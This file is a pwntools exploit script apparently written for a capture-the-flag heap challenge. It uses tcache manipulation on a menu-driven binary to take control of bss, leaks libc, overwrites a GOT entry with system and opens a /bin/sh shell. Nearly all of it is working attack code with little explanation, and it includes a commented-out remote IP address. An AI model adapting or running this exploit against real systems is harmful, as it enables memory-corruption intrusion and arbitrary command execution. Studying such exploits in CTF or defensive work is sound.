#!/usr/bin/env python3
from pwn import *
import time

context.terminal = ['/usr/bin/kitty']
# context.terminal = "tmux splitw -v".split()
context.encoding = 'latin'
context.binary = elf = ELF('./chall')
context.log_level = 'debug'

libc = elf.libc

def menu(option: int):
    p.sendlineafter("Input: ", str(option))

def create(idx: int, size: int, config: bytes):
    menu(0)
    p.sendlineafter("idx >> ", str(idx))
    p.sendlineafter("size >> ", str(size))
    p.sendlineafter("config >> ", config)

def delete(idx: int):
    menu(1)
    p.sendlineafter("idx >> ", str(idx))

def launch(idx: int):
    menu(2)
    p.sendlineafter("idx >> ", str(idx))

def terminate():
    menu(3)

def debug():
    input("debug")

addr = {
    "delete": 0x401589
}
addr['create'] = 0x401419
addr['exec_launch'] = 0x401227
addr['exec_terminate'] = 0x40132E

# b *0x4011E2
gs = f"""
c
"""

# p = process(elf.file.name)
# p = gdb.debug(elf.file.name, gdbscript = gs, aslr=True)
p = remote('localhost', 32768)
# p = remote('34.146.186.1', 41777)

# initialize chunks
create(3, 0x99, cyclic(0x99-1, n=8))
create(4, 0x10, flat(0x000000404180))
create(0, 0x10, 'A' * 0xf)
create(1, 0x10, 'B' * 0xf)
create(2, 0x10, 'C' * 0xf)

# initialize tcache
delete(2)
delete(1)

# change ipc->vm to chunk of index 3 to overflow
launch(0)
time.sleep(2)
launch(3)
time.sleep(4)

# reset ipc->vm to vms[0]
create(13, 0x10, 'D' * 0xf)
launch(13)

# get bss control 0x000000404180, overwrite vms[n]
# payload = flat('z'*119)
payload = flat(0x000000404018) * 15
payload = flat(
    0, 0x20,
    p64(0x000000404018) * 13
)
payload = payload[:-1]
create(6, len(payload)+1, payload)  # bss

terminate()

# cleanup buddy
delete(4)
delete(0)
delete(3)

# now occupied are 13 and 6
# we have to copy some huge buffer to 6, which overwrites 
# order matter buddy, check gdb (you wouldn't understand 
# when you look again anyway lol)
create(0, 0x99, cyclic(0x99-1, n=8))
create(1, 0x10, 'M' * 0xf)
create(2, 0x10, flat(0x000000404160))
create(3, 0x10, 'N' * 0xf)
# create(4, 0x10, 'O' * 0xf)
# create(5, 0x10, 'P' * 0xf)

# debug()
delete(3)
delete(13)

# debug()
time.sleep(5)
launch(1)
time.sleep(2)
launch(0)
time.sleep(5)

# debug()

create(14, 120, flat(0x000000404160, 0xbeef))
create(4, 0x30, flat(0xff, 0x000000404190, 1, 0x000000404190, 3, 0x21, 5, 6)) # sleep got
# debug()

create(5, 0x20, flat(1, 0x000000404190+0x10))
launch(5)

# debug()
terminate()

p.recvuntil(b"Your Config: \n")

libc.address = unpack(p.recv(6), 'all') - (0x7bad9ea97910 - 0x00007bad9ea00000)
print(f"libc: {hex(libc.address)}")

# launch(4)
# debug()

p.sendline("1")
p.sendlineafter("idx >> ", str(0))
delete(1)
delete(2)

# overwrite got
# don't use 4,5,6,14
# 4 write to 4 to for 

create(0, 0x99, cyclic(0x99-1, n=8))
create(1, 0x10+1, flat(0x000000404018, 1))
create(2, 0x10, 'Z' * 0xf)

# for tcache
create(7, 0x10, 'o' * 0xf)
create(8, 0x10, 'p' * 0xf)
# create(9, 0x10, 'q' * 0xf)

delete(2)
delete(8)

launch(7)
time.sleep(2)
launch(0)
time.sleep(4)

# overwrite got with system symbol
create(0, 0x9, "/bin/sh\0")
create(1, 0x9, p64(libc.sym['system']))

delete(0)

p.interactive()
